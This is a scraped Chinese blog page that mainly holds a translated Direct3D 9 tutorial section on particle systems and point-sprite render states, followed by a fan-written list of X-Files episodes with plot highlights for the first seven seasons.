class=post-meta-item><span class=post-meta-item-icon><i class="fas fa-solid fa-calendar"></i>
</span><span class=post-meta-item-text title=发表于>发表于：
</span><time title="创建时间：2008年04月04日 20:05:00 CST" itemprop="dateCreated datePublished" datetime="2008-04-04 20:05:00 +0800 +0800">2008年04月04日
</time></span><span class=post-meta-item><span class=post-meta-item-icon><i class="fas fa-solid fa-folder-open"></i>
</span><span class=post-meta-item-text title=分类于>分类于：
</span><span itemprop=about itemscope itemtype=http://schema.org/Thing><a href=/categories/gamedev/ itemprop=url rel=index><span itemprop=name>dev/GameDev</span>
</a></span></span><span class=post-meta-item title=浏览><span class=post-meta-item-icon><i class="fas fa-solid fa-eye"></i>
</span><span class=post-meta-item-text>浏览：
</span><span id=pageview-count data-path=/post/d3d-particle-system-1/><i class="fa fa-sync fa-spin"></i></span></span></div></div></header><div class=post-body itemprop=articleBody><p>许多自然现象是由很多小的小颗粒组成的，它们有相似的行为。（例如，雪花落下，闪烁的火焰，冲出枪管的“子弹”），粒子系统用来模拟这种现象。<p>14.1 粒子和点精灵（Point Sprite）<p>粒子是一个很小的对象，它通常用来模拟数学中的一个点。点元是用来显示粒子的很好的方案，可是点元被光栅化成一个简单的像素。这没给我们多少灵活性，因为我们想有各种大小不同的粒子，并且把整个纹理平滑映射到这些粒子上。在Direct3D 8.0以前，因为点元方法的局限性而完全不使用他们。代替的方法是程序员将使用公告板去显示粒子，一个板是一个方格，世界矩阵用它来确定方向，使它总是朝向照相机。<p>Direct3D 8.0引入一个特殊的点元叫点精灵，多数时候被应用在粒子系统中。与一般的点元不同的是，点精灵有纹理映射并能改变大小。与公告板不同的是，能用一个简单的点描述一个点精灵，节省内存和处理时间，因为我们只是必须保存和处理一个点，而公告板则是四个。<br>14.1.1 结构的格式<p>我们使用下面的顶点结构来描述粒子的位置和颜色：<br>struct sParticle<br>{<br>&nbsp;&nbsp;&nbsp; D3DXVECTOR3 position;<br>&nbsp;&nbsp;&nbsp; D3DCOLOR&nbsp;&nbsp;&nbsp; color;<br>};<p>const DWORD PARTICLE_FVF = D3DFVF_XYZ | D3DFVF_DIFFUSE;<p>这个结构只保存粒子的位置和颜色，这取决于你程序的需要，你能够用同样的结构去保存一套纹理坐标。<p>增加一个浮点变量给Particle结构去指定粒子的大小是可能的。我们必须增加一个D3DFVF_PSIZE标记给我们的灵活的顶点格式，以反映这个变化。每个粒子维护自己的大小很有用，因为它允许我们以具体情况指定并改变粒子的大小。可是，大多数的图形卡不支持控制粒子的大小，因此我们不使用它。（检查D3DFVFCAPS_PSIZE在D3 DCAPS9结构的FVFCaps成员）代替的方法是用渲染状态（render states）去控制粒子的大小，就像你很快看到的，有尺寸成员的顶点结构的例子：<br>strict Particle<p>{<p>&nbsp;&nbsp;&nbsp;&nbsp; D3DXVECTOR3 _position;<p>&nbsp;&nbsp;&nbsp;&nbsp; D3DCOLOR&nbsp;&nbsp;&nbsp; _color;<p>&nbsp;&nbsp;&nbsp;&nbsp; float&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; _size;<p>&nbsp;&nbsp;&nbsp;&nbsp; static const DWORD FVF;<p>};<p>const DWORD Particle::FVF = D3DFVF XYZ | D3DFVF DIFFUSE |&nbsp; D3DFVF_PSIZE;<p>注意：通过vertex shader，能够获取每个粒子的大小，即使你的硬件不支持D3DFVFCAPS_PSIZE。<br>14.1.2点精灵（Point Sprite）渲染状态<p>点精灵的行为大部分由渲染状态（render states）来控制，现在让我们来看一下这些渲染状态：<p>D3DRS_POINTSPRITEENABLE—A Boolean value. The default value is false.<p>True表示将当前的纹理全部映射到点精灵上。<p>False 表示用指定的纹理坐标映射到点精灵的点（图素）上。<p>_device->SetRenderState(D3DRS_POINTSPRITEENABLE, true);<br>D3DRS_POINTSPRITEENABLE<br>bool value. When TRUE, texture coordinates of point primitives are set so that full textures are mapped on each point. When FALSE, the vertex texture coordinates are used for the entire point. The default value is FALSE. You can achieve DirectX 7 style single-pixel points by setting D3DRS_POINTSCALEENABLE to FALSE and D3DRS_POINTSIZE to 1.0, which are the default values.<p>D3DRS_POINTSCALEENABLE—A Boolean value. The default value is false.<p>True表示用视图空间单位来解释点的大小。视图空间单位的3D空间点在照相机中，点精灵将会自动缩放，这取决到它有多远, 像其他对象一样，离照相机近的粒子比离照相机远的粒子要大。<p>False 表示点的大小将用屏幕空间单位来解释。屏幕空间单位是屏幕上的像素单位。. 因此如果你指定false, 例如, 设置点精灵的尺寸为3, 则点精灵在屏幕区域中的尺寸为3×3像素。.<p>_device->SetRenderState(D3DRS_POINTSCALEENABLE, true);<br>D3DRS_POINTSCALEENABLE<br>bool value that controls computation of size for point primitives. When TRUE, the point size is interpreted as a camera space value and is scaled by the distance function and the frustum to viewport y-axis scaling to compute the final screen-space.<p>D3DRS_POINTSIZE—表示点精灵的尺寸. 这个值可以任意指定视图空间或屏幕空间的点精灵的尺寸, 取决于D3DRS_POINTSCALEENABLE状态如何设置. 下面的代码段设置点的尺寸为2.5个单位。:<p>_device->SetRenderState( D3DRS_POINTSIZE, float_to_dword(2.5f) );<br>D3DRS_POINTSIZE<br>A float value that specifies the size to use for point size computation in cases where point size is not specified for each vertex. This value is not used when the vertex contains point size. This value is in screen space units if D3DRS_POINTSCALEENABLE is FALSE; otherwise this value is in world space units. The default value is the value a driver returns. If a driver returns 0 or 1, the default value is 64, which allows software point size emulation. Because the IDirect3DDevice9::SetRenderState method accepts DWORD values, your application must cast a variable that contains the value, as shown in the following code example.<br>m_pDevice9->SetRenderState(D3DRS_POINTSIZE, *((DWORD*)&amp;pointSize));<br>DWORD float_to_dword(float f)<br>{<br>&nbsp;&nbsp;&nbsp; return *((DWORD*)&amp;f);<br>}<p>D3DRS_POINTSIZE_MIN—表示点精灵的最小尺寸。例子，将设置最小值为0.2：<p>_device->SetRenderState(D3DRS_POINTSIZE_MIN, float_to_dword(0.2f));<br>D3DRS_POINTSIZE_MIN<br>A float value that specifies the minimum size of point primitives. Point primitives are clamped to this size during rendering. Setting this to values smaller than 1.0 results in points dropping out when the point does not cover a pixel center and antialiasing is disabled or being rendered with reduced intensity when antialiasing is enabled. The default value is 1.0f. The range for this value is greater than or equal to 0.0f. Because the IDirect3DDevice9::SetRenderState method accepts DWORD values, your application must cast a variable that contains the value, as shown in the following code example.<br>m_pDevice9->SetRenderState(D3DRS_POINTSIZE_MIN, *((DWORD*)&amp;pointSizeMin));<p>D3DRS_POINTSIZE_MAX—表示点精灵的最大尺寸。例子，将设置最大值为5.0:<p>_device->SetRenderState(D3DRS_POINTSIZE_MAX, float_to_dword(5.0f));<br>D3DRS_POINTSIZE_MAX<br>A float value that specifies the maximum size to which point sprites will be clamped. The value must be less than or equal to the MaxPointSize member of D3DCAPS9 and greater than or equal to D3DRS_POINTSIZE_MIN. The default value is 64.0. Because the IDirect3DDevice9::SetRenderState method accepts DWORD values, your application must cast a variable that contains the value, as shown in the following code example.<br>m_pDevice9->SetRenderState(D3DRS_PONTSIZE_MAX, *((DWORD*)&amp;pointSizeMax));<p>D3DRS_POINTSCALE_A, D3DRS_POINTSCALE_B, D3DRS_POINTSCALE_C—这3个常量表示如何根据距离控制点精灵的尺寸—这个距离是点精灵到照相机的距离。<br>D3DRS_POINTSCALE_A<br>A float value that controls for distance-based size attenuation for point primitives. Active only when D3DRS_POINTSCALEENABLE is TRUE. The default value is 1.0f. The range for this value is greater than or equal to 0.0f. Because the IDirect3DDevice9::SetRenderState method accepts DWORD values, your application must cast a variable that contains the value, as shown in the following code example.<br>m_pDevice9->SetRenderState(D3DRS_POINTSCALE_A, *((DWORD*)&amp;pointScaleA));<br>D3DRS_POINTSCALE_B<br>A float value that controls for distance-based size attenuation for point primitives. Active only when D3DRS_POINTSCALEENABLE is TRUE. The default value is 0.0f. The range for this value is greater than or equal to 0.0f. Because the IDirect3DDevice9::SetRenderState method accepts DWORD values, your application must cast a variable that contains the value, as shown in the following code example.<br>m_pDevice9->SetRenderState(D3DRS_POINTSCALE_B, *((DWORD*)&amp;pointScaleB));<br>D3DRS_POINTSCALE_C<br>A float value that controls for distance-based size attenuation for point primitives. Active only when D3DRS_POINTSCALEENABLE is TRUE. The default value is 0.0f. The range for this value is greater than or equal to 0.0f. Because the IDirect3DDevice9::SetRenderState method accepts DWORD values, your application must cast a variable that contains the value, as shown in the following code example.<br>m_pDevice9->SetRenderState(D3DRS_POINTSCALE_C, *((DWORD*)&amp;pointScaleC));<p>D3D用以下的公式去计算点精灵的最终尺寸，这取决于距离和这3个常量。<p>其中：<p>FinalSize：距离计算后，点精灵的最后尺寸。<p>ViewportHeight：视口的高度。<p>Size：分别为D3DRS_POINTSCALE_A, D3DRS_POINTSCALE_B, and D3DRS_POINTSCALE_C值。<br>D：在视图空间中点精灵与照相机的距离。因为照相机被放置在视图空间中的原点，这个值是：，也是点精灵所在的位置。<p>下面代码设置点精灵的距离常量，因此远处的点精灵将变小。<br>_device->SetRenderState(D3DRS_POINTSCALE_A, float_to_dword(0.0f));<p>_device->SetRenderState(D3DRS_POINTSCALE_B, float_to_dword(0.0f));<p>_device->SetRenderState(D3DRS_POINTSCALE_C, float_to_dword(1.0f));<p>14.1.3 粒子和他们的属性<p>一个粒子系统是由除了位置、颜色以外的更多的属性组成，例如，一个粒子有速度。然而，这些额外的属性对于渲染粒子来说不是必须的。因此，我们在单独的结构中保存渲染粒子所必须的数据和属性。当我们创建、显示或更新粒子时，我们使用属性来工作。当我们准备渲染时，我们从sParticle（粒子）结构中COPY位置和颜色。<p>对于我们模拟的具体粒子系统，粒子的属性也是不同的。因此我们能够归纳一些通用的属性，大多数系统用不上这么多，一些系统需要的属性这里可能还没有。<br>struct sParticleAttribute<br>{<br>&nbsp;&nbsp;&nbsp; sParticleAttribute()<br>&nbsp;&nbsp;&nbsp; {<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; life_time = 0.0f;<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; age&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; = 0.0f;<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; is_alive&nbsp; = true;<br>&nbsp;&nbsp;&nbsp; }<p>&nbsp;&nbsp;&nbsp; D3DXVECTOR3 position;<br>&nbsp;&nbsp;&nbsp; D3DXVECTOR3 velocity;<br>&nbsp;&nbsp;&nbsp; D3DXVECTOR3 acceleration;<br>&nbsp;&nbsp;&nbsp; float&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; life_time;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; // how long the particle lives for before dying<br>&nbsp;&nbsp;&nbsp; float&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; age;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; // current age of the particle<br>&nbsp;&nbsp;&nbsp; D3DXCOLOR&nbsp;&nbsp;&nbsp; color;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; // current color of the particle<br>&nbsp;&nbsp;&nbsp; D3DXCOLOR&nbsp;&nbsp;&nbsp; color_fade;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; // how the color fades with respect to time<br>&nbsp;&nbsp;&nbsp; bool&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; is_alive;<br>};<p>position—粒子在世界空间中的位置<p>velocity—粒子的速度，每秒多少个单位。<p>acceleration—粒子的加速度, 每秒多少个单位。<p>life_time—粒子的生命周期. 例如,当一个时间段后，我们可以杀死一个激光柱的粒子.<p>age—粒子的当前年龄。<p>color—粒子的颜色。<p>color_fade—粒子随时间的变化而褪去的颜色。<p>is_alive—True 表示粒子活着;false 表示粒子死了。</p></div><footer class=post-footer><div class=post-button><a class=btn href=/post/d3d-particle-system-1/#more rel=contents>阅读全文 &#187;</a></div><div class=post-eof></div></footer></article></div><div class=post-block><article itemscope itemtype=http://schema.org/Article class=post-content lang><link itemprop=mainEntityOfPage href=https://blogs.qipai360.cn/post/x-files-directory-and-plot-introduction/><span hidden itemprop=author itemscope itemtype=http://schema.org/Person><meta itemprop=image content="/imgs/avatar.jpg"><meta itemprop=name content="Rise"></span><span hidden itemprop=publisher itemscope itemtype=http://schema.org/Organization><meta itemprop=name content="Rise"><meta itemprop=description content="福兮祸兮，焉知所依？冬去冰泮，春来萌荣。朝生暮死，亦可惊鸿。知足者富，自足者强。"></span><span hidden itemprop=post itemscope itemtype=http://schema.org/CreativeWork><meta itemprop=name content="X-Files 目录及剧情简介"><meta itemprop=description content="X-Files 第（1）季目录及剧情简介1X01 领航员 Pilot 1X02 深喉咙 DEEP THROAT 1X03 突变异种 SQUEEZE 1X04 奥卡布基湖奇案 CONDUIT 1X05 泽西恶魔 THE JERSEY DEVIL 1X06 鬼魅阴影(幽魂) SHADOWS 1X07 幽灵电脑 GHOST IN THE MACHINE 1X08 冰核计划 ICE 1X09 太空惊魂 SPACE 1X10 坠落天使 FALLEN ANGEL 1X11 夺命夏娃 EVE 1X12 恶魔烈火 FIRE 1X13 心灵感应 BEYOND THE SEA 1X14 性别扭曲 GENDERBENDER 1X15 至死不渝 LAZARUS 1X16 追命恶魔 YOUNG AT HEART 1X17 外星访客 E.B.E. 1X18 神迹 MIRACLE MAN 1X19 变形狼人 SHAPES 1X20 夜幕低垂 DARKNESS FALLS 1X21 终结突变异种 TOOMS 1X22 附身 BORN AGAIN 1X23 双胞奇缘 ROLAND 1X24 外星混血 THE ERLENMEYER FLASK  在第一季里．．．　* Mulder和Scully相识并成为搭档。（领航员） 　* Scully在Mulder面前宽衣解带，给他看她的后腰。（领航员） 　* Scully撞到Mulder和旧情人在接吻，并表现出了一丝丝的嫉妒。（恶魔烈火） 　* Scully的父亲去世，他在步入天堂之前匆匆拜访了Scully。（心灵感应） 　* Scully被一名占据了他前任男友身体的罪犯绑架，这是她第一次被绑架。（至死不渝） 　* 孤枪侠首次出场。Frohike说Scully很“诱人”。（外星访客） 　* Mulder骗Scully说他从不让别人叫他“Fox”。（终结突变异种） 　* Mulder被绑架了，Scully偷了一个外星人胚胎去交换他。（外星混血） 　* X档案被关闭，Mulder和Scully被分开。（外星混血）2005-4-14 14:17 龙骑兵X-Files 第（2）季目录及剧情简介2X01 绿色小矮人 LITTLE GREEN MEN 2X02 下水道惊魂记 THE HOST 2X03 恐惧症 BLOOD 2X04 不能睡的人 SLEEPLESS 2X05 第四类接触(上) DUANE BARRY 2X06 第四类接触(下) ASCENSION 2X07 三位一体 3 2X08 起死回生 ONE BREATH 2X09 火山口惊魂 FIREWALKER 2X10 红色博物馆 RED MUSEUM 2X11 再生 EXCELSIUS DEI 2X12 剃刀杀人狂 AUBREY 2X13 摧花狂疑云 IRRESISTIBLE 2X14 巫教学校 DIE HAND DIE VERLETZT 2X15 巫毒的复仇 FRESH BONES 2X16 殖民地球(上) COLONY 2X17 殖民地球(下) END GAME 2X18 审判 FEARFUL SYMMETRY 2X19 幽灵船 DOD KALM 2X20 斑身人 HUMBUG 2X21 巫童 THE CALUSARI 2X22 剖尸 F. EMASCULATA 2X23 柔光 SOFT LIGHT 2X24 我们的小镇 OUR TOWN 2X25 外星档案(上) ANASAZI  在第二季里．．．* Mulder偷偷跑去南美丛林寻找外星人，Scully赶去援救他。（绿色小矮人） 　* Alex Krycek首次亮相。（不能睡的人） 　* Gillian Anderson怀孕了。 　* Scully再次被绑架了，这次是外星人干的。于是GA就有时间去生孩子了。（第四类接触(下)） 　* X档案重新开启。（第四类接触(下)） 　* Mulder有了在整部影集播出中唯一的一次性行为，也许直到第七年为止。（三位一体） 　* Melissa Scully首次出场。（起死回生） 　* Scully被外星人送了回来，并险些因为她的家人移除了她的维生装置而死亡。（起死回生） 　* 我们知道了Skinner原来曾是一名海军陆战队员，在越南受重伤时经历了灵魂出体的体验，但最终活了来下来并告诉我们这一切。（起死回生） 　* Scully又被绑架了，这次绑架她的是Donnie Pfaster，一个恶魔化身的死亡崇拜者。（摧花狂疑云） 　* 当看到一名成年妇女声称自己是Samantha Mulder时，我们第一次上了个大当。（殖民地球(上)） 　* 又一次，Scully被一名外星赏金猎人绑架了，Mulder用他的“妹妹”做了交换。（殖民地球(下)） 　* Scully在医院发威，指挥医生们治疗从其北极之旅归来的Mulder，救活了他的命。（殖民地球(下)） 　* Scully再一次地被绑架了，这次是一群食人族。她还几乎被斩首，变成镇里的人的盘中餐。（我们的小镇） 　* Mulder被人下了毒，并在胡佛大厦的走廊里和Skinner打了一架。（外星档案(上)） 　* Mulder的父亲被谋杀了。（外星档案(上)） 　* Scully开枪打伤了Mulder，然后带着他驾车穿越整个美国，并细心照顾他直到他康复，于是癌人就能够把他困在被掩埋的列车车厢里，并试图烧死他。（外星档案(上)）2005-4-14 14:18 龙骑兵X-Files 第（3）季目录及剧情简介3X01 外星档案(中) THE BLESSING WAY 3X02 外星档案(下) PAPER CLIP 3X03 闪电人 D.P.O. 3X04 相士杀手 CLYDE BRUCKMAN'S FINAL REPOSE 3X05 回魂复仇者 THE LIST 3X06 网络情人 2SHY 3X07 幽灵士兵 THE WALK 3X08 解脱 OUBLIETTE 3X09 扑朔迷离(上) NISEI 3X10 扑朔迷离(下) 731 3X11 天启 REVELATIONS 3X12 粪虫大战 WAR OF THE COPROPHAGES 3X13 双姝奇缘 SYZYGY 3X14 恶魔图像 GROTESQUE 3X15 追凶记(上) PIPER MARU 3X16 追凶记(下) APOCRYPHA 3X17 步步危机 PUSHER 3X18 阿玛鲁 TESO DOS BICHOS 3X19 冥纸 HELL MONEY 3X20 科幻故事 JOSE CHUNG'S 'FROM OUTER SPACE' 3X21 梦妖 AVATAR 3X22 湖怪 QUAGMIRE 3X23 电视杀人事件 WETWIRED 3X24 追杀令 TALITHA CUMI  在第三季里．．．* Scully被停职，Mulder被认为已经死了。（外星档案(中)） 　* Scully发现了她脖子后的植入物，并把它取了出来。（外星档案(中)） 　* Scully用枪指着Skinner，Skinner用枪指着Scully，Mulder用枪指着Skinner。这是个墨西哥平局！（外星档案(中)） 　* Krycek和Luis Cardinale意外地杀害了Scully的姐姐Melissa。当然，他们原来是想杀Scully的。（外星档案(中)） 　* Skinner对癌人说“噘起你的老嘴亲我的P股”。（外星档案(下)） 　* Willianm B. Davis（癌人）证明了这已超出他的表演能力范围。（外星档案(下)） 　* Clyde Bruckman告诉Scully她是不会死的。（相士杀手） 　* Scully领养了一只狗。（相士杀手） 　* Scully吸烟了。（双姝奇缘） 　* 他们用Gillian Anderson女儿的名字[Piper]为这集命名。（追凶记(上) Piper Maru） 　* Skinner被用于杀害Scully姐姐的同一支枪击中了。（追凶记(下)） 　* Mulder在和Robert Modell玩俄罗斯轮盘赌时，差点儿向Scully开枪。（步步危机） 　* 我们了解到原来Skinner已经结过婚。他与一名妓女发生了关系，并由于他的睡眠紊乱症而有可能在睡梦中杀害了她，他的妻子也去世了--可能。（梦妖） 　* Scully的狗--魁魁格，被一只美洲鳄吃掉了。（湖怪） 　* Mulder险些被同一只美洲鳄吃掉。（湖怪） 　* Scully被洗了脑，差点儿杀死Mulder。也可能是因为Scully的妈妈一直走在他前面，他才幸免于难。（电视杀人事件）2005-4-14 14:20 龙骑兵X-Files 第（4）季目录及剧情简介4X01 颠覆地球 HERRENVOLK 4X02 灵异照片 UNRUHE 4X03 故乡 HOME 4X04 非洲邪灵 TELIKO 4X05 前世今生 THE FIELD WHERE I DIED 4X06 整型专家 SANGUINARIUM 4X07 癌人秘辛 MUSINGS OF A CIGARETTE SMOKING MAN 4X08 偷心人 PAPER HEARTS 4X09 非常手段(上) TUNGUSKA 4X10 非常手段(下) TERMA 4X11 紫雨 EL MUNDO GIRA 4X12 婚礼 KADDISH 4X13 再见贝蒂 NEVER AGAIN 4X14 无头尸奇案 LEONARD BETTS 4X15 我要活下去 MEMENTO MORI 4X16 复仇使者 UNREQUITED 4X17 失踪的九分钟(上) TEMPUS FUGIT 4X18 失踪的九分钟(下) MAX 4X19 回到过去 SYNCHRONY 4X20 外星爹地 SMALL POTATOES 4X21 天花蜂 ZERO SUM 4X22 免于恐惧 ELEGY 4X23 恶魔 DEMONS 4X24 真相与谎言 GETHSEMANE  在第四季里．．．* Mulder的母亲中风了。（颠覆地球） 　* Mulder和Scully交换了各自的家族遗传史。不幸的是，他们当时还不知道Scully不孕，而且无法提供乳汁给他们俩的宝宝（呃，也许吧！）（故乡） 　* Scully又被绑架，并险些被切除了前额脑叶。（灵异照片） 　* Mulder在回忆前世时自欺欺人。（前世今生） 　* Scully因为藐视法庭被关进监狱。（非常手段(下)） 　* Mulder被感染“黑癌”。（非常手段(下)） 　* Krycek的左臂被切除。（非常手段(下)） 　* Scully获知她得了癌症。（无头尸奇案；我要活下去） 　* Scully有了一次心理上的认同转折点，并有可能有了整部影集中唯一一次的性行为（也许第七年那次除外）。（再见贝蒂） 　* Scully刺了个纹身！（再见贝蒂） 　* Scully告诉Mulder她患了癌症，但没有告诉她妈妈！（我要活下去） 　* Mulder发现在第二年里Scully被外星人绑架时，她所有的卵子都被偷走了，并且还找回了一些。（我要活下去） 　* Scully差点儿亲吻了Mulder，除了那不是真正的Mulder，而是会改变肌肉形状的Eddie Van Blundht。（外星爹地） 　* 我们看到Skinner只穿着他的底裤！不错！（天花蜂） 　* Scully看到了鬼魂，因为她也快死了。（免于恐惧） 　* Mulder偷偷跑去罗德岛，然后因为谋杀罪被捕，穿着一件亮橙色的囚服在监狱过了一夜，然后被Scully救了。（恶魔） 　* Mulder自杀了……也许吧。（真相与谎言）2005-4-14 14:21 龙骑兵X-Files 第（5）季目录及剧情简介5X01 惊爆点 Unusual Suspects 5X02 追求真理(上) Redux 5X03 追求真理(下) Redux II 5X04 人兽谜 Detour 5X05 孤寂之旅(上) Christmas Carol 5X06 科学怪人 Post-Modern Prometheus 5X07 孤寂之旅(下) Emily 5X08 猎狐计划 Kitsunegari 5X09 杀父真凶 Schizogeny 5X10 恐怖娃娃 Chinga 5X11 魔脑 Kill Switch 5X12 新版吸血鬼 Bad Blood 5X13 Ｘ病人(上) Patient X 5X14 Ｘ病人(下) The Red and The Black 5X15 旅人 Travelers 5X16 心眼 Mind's Eye 5X17 心灵告白 All Souls 5X18 非常卧底 The Pine Bluff Variant 5X19 双疯 Folie A Deux 5X20 神童 The End  在第五季里．．．* Mulder被认为已经死了。（追求真理（上）） 　* Scully对警察、Skinner和FBI长官说谎，骗他们说Mulder“死了”，然后因为病发倒进Skinner的臂弯。经诊断她的癌症已经扩散，于是她就呆在医院里等死。但Mulder毕竟还活着！（追求真理（上）） 　* 我们见到了Bill Scully，他说Mulder是个“可怜的王八蛋”。（追求真理（下）） 　* Mulder找到一枚芯片，并把它放入Scully的后脖子。她的癌症消退了。（追求真理（下）） 　* 癌人被杀了。呃，当然不是真的，不过至少在这个季度接下来的单元里，我们不用再理会他了。（追求真理（下）） 　* 在佛罗里达的未开垦丛林里，Scully让受伤的Muler躺在她的腿上过夜，还唱“Joy to the World”哄他睡觉。（人兽谜） 　* Scully和Mulder在雪尔的音乐会上共舞。（科学怪人） 　* Scully发现她有一个不是她自己生的亲生女儿。但最后她女儿死了。（孤寂之旅） 　* 我们见到了癌人的妻子，还有Scully差点儿被活活烧死。（Ｘ病人（上）） 　* Scully看到了他死去的女儿。（心灵告白） 　* Mulder成了卧底。（非常卧底） 　* Mulder成了疯子。（双疯） 　* 我们认识了Mulder的另一位旧情人，Diana Fowley探员；Scully不信任她，一切呈现不祥之兆。 　* X档案办公室被烧毁。（神童） 　* 这期间…… 癌人又活跃了起来，真是不幸。 　* Mulder和Scully在走廊里差一点儿就接吻了。 　* Scully又被绑架，成了外星人胚胎成长的温床。 　* Mulder赶去南极营救Scully。电影编剧错把David Duchovny当成阿诺德·施瓦辛格了。2005-4-14 14:22 龙骑兵X-Files 第（6）季目录及剧情简介6X01 开端 The Beginning 6X02 向前冲 Drive 6X03 百慕达惊梦 Triangle 6X04 梦境(上） Dreamland 6X05 梦境(下) Dreamland II 6X06 亲密关系 Terms Of Endearment 6X07 雨王 The Rain King 6X08 圣诞幽魂 How The Ghosts Stole Christmas 6X09 心灵杀手 Tithonus 6X10 S.R. 819 S. R. 819 6X11 父与子(上) Two Fathers 6X12 父与子(下) One Son 6X13 美丽新社区 Arcadia 6X14 水怪 Agua Mala 6X15 星期一 Monday 6X16 变形犬 Alpha 6X17 穿墙人 Trevor 6X18 爱情小说 Milagro 6X19 难兄难弟 Three of A Kind 6X20 快乐人生 The Unnatural 6X21 田野之旅 Field Trip 6X22 创世纪 Biogenesis  在第六季里．．．* Mulder和Scully再次失去X档案。他们离开了Skinner的监督，被重新分配到Alvin Kersh副座的监管下。Spender和Fowley探员接手X档案。（开端） 　* Mulder吻了Scully，除了那不是真的她。Scully给了Mulder一记右勾拳，除了那不是真的她。（百慕达惊梦） 　* Mulder告诉真的Scully他爱她；她说“哦老兄”，然后走开。（百慕达惊梦） 　* Scully在电梯里吻了Skinner。Skinner看上去害羞极了。（百慕达惊梦） 　* Mulder有了一间卧室和一张水床。（梦境（下）） 　* Mulder和Scully在一栋闹鬼的房子里共度圣诞前夜，并向对方开枪，但不是真的开枪。（耶诞幽魂） 　* 在遇到一头飞来的牛后，Mulder和Scully不得不共享一间汽车旅馆房间，但我们看不到里面！（雨王） 　* Victoria Jackson吻了Mulder。Mulder看上去害羞极了。（雨王） 　* Krycek用纳米机器人感染了Skinner，并因此控制了他。（S.R. 819） 　* Scully被另一名FBI探员开枪打中腹部，并因此获得永生。Clyde Bruckman说的没错。（心灵杀手） 　* 我们知道了癌人的名字，大概是C.G.B. Spender什么的。（父与子(上)） 　* Mulder和Scully一起淋浴。（父与子(下)） 　* 阴谋联盟里的大部分成员都被干掉了（但没有癌人，该死！）。（父与子(下)） 　* Mulder和Scully重新拥有了X档案。（父与子(下)） 　* 癌人杀死了他的儿子，Jeffrey Spender探员。不过在第九年里我们发现他还没死。（父与子(下)） 　* Mulder的水床漏了个洞。（星期一） 　* “Scully探员早已坠入了爱河。”（爱情小说） 　* 一个变态外科医生想要占有Scully的心（脏）。她对此只表现出了一点点的心烦意乱。（爱情小说） 　* Mulder和Scully打棒球。（快乐人生） 　* Mulder听到说话声。（创世纪）2005-4-14 14:24 龙骑兵X-Files 第（7）季目录及剧情简介  7X01 我想做好人 Hungry 7X02 幸运儿 The Goldberg Variation 7X03 第六次大灭绝（上） The Sixth Extinction 7X04 第六次大灭绝（下） The Sixth Extinction II: Amor Fati 7X05 千禧计划 Millennium 7X06 急速快感 Rush 7X07 替天行道 Orison 7X08 魔术大师 The Amazing Maleeni 7X09 不义之徒 Signs & Wonders 7X10 生命的奇迹（上） Sein Und Zeit 7X11 生命的奇迹（下） Closure 7X12 Ｘ警察 X-Cops 7X13 虚拟战斗 First Person Shooter 7X14 夺命魔咒 Theef 7X15 尔虞我诈 En Ami 7X16 贤妻良母 Chimera 7X17 人生旅途 all things 7X18 超级烟* Brand X 7X19 好莱坞式Ｘ档案 Hollywood A.D. 7x20 斗阵俱乐部 Fight Club 7x21 三个愿望 Je Souhaite 7x22 安魂曲 Requiem  在第七季里．．．  　* Mulder发了狂，还拥有了读心术。Scully去了非洲。（第六次大灭绝（上）） 　* Mulder重新演绎了[基督最后的诱惑]。（第六次大灭绝（下）） 　* Mulder做了脑部手术。癌人也做了。（第六次大灭绝（下）） 　* 癌人告诉Mulder他是他的父亲。（第六次大灭绝（下）） 　* Scully再次救了Mulder的命。（第六次大灭绝（下）） 　* Fowley探员被从镜头前干掉了。她好像不会再回来了。（第六次大灭绝（下）） 　* Scully被一个她明明知道已经死了人攻击。Mulder被好几个他明明知道已经死了的人攻击。（千禧计划） 　* Mulder在新年前夜吻了Scully，这次是真的。她看起来一点也不激动。（千禧计划） 　* Donnie Pfaster从监狱逃了出来，并四处追逐Scully，他把她叫做“逃脱者”。Scully杀死了他，尽管没有必要。干得好，女孩儿！（替天行道） 　* Mulder的母亲自杀，因为她患上了并不致命的疾病，已经“垂死”。（生命的奇迹（上）） 　* Mulder找到了他妹妹。她已经死了。切！（生命的奇迹（下）） 　* Mulder和Scully意外地出现在影集“Cops”中。 　* Scully瞎了，但不是真的。（夺命魔咒） 　* Scully偷偷和癌人跑了。他是对她下药并令她恢复生育能力了吗？？他有没有令她怀孕呢？？你也知道，他很喜欢做别人的父亲。（尔虞我诈） 　* Scully重遇往日激情，尝试了另类巫术疗法，认清了她生命中的一些事情，并且，有可能，和Mulder发生了关系。（人生旅程） 　* Mulder和Scully的事迹被改编成了电影，在电影最后，他们俩手牵手地走出镜头。（好莱坞式Ｘ档案） 　* Mulder几乎因为吸入了满肺的烟*甲虫而丧命。Scully博士救了他。（超级烟*） 　* Skinner与孤枪侠们见面。（安魂曲） 　* 癌人又一次被杀了。让我们希望这次是一劳永逸地解决问题了。（安魂曲） 　* Mulder被外星人绑架了。他离开的时候还戴着Scully的十字架项链--嗯，我们以为是这样的，但现在知道了其实他没戴。所有以此为题材的fanfic都作废了。（安魂曲） 　* Skinner哭了。呃，至少Mitch Pileggi做了最大的努力表现出了他在哭。让他喘口气吧！他以前是主修会计的。会计从来都不哭。（安魂曲） 　* 本应该是不孕的Scully怀孕了。（本应该是不孕的）2005-4-14 14:25 龙骑兵在第八季里．．．  　* Robert Patrick加入剧组扮演特别探员John Doggett。在他和Scully首次见面时，她往他脸上泼了一杯水。（Within） 　* Kersh副座重新露面，但现在他的身份是副局长，Skinner的上司。哦老天！不过话说回来，终于又有人当坏蛋了。（Within） 　* 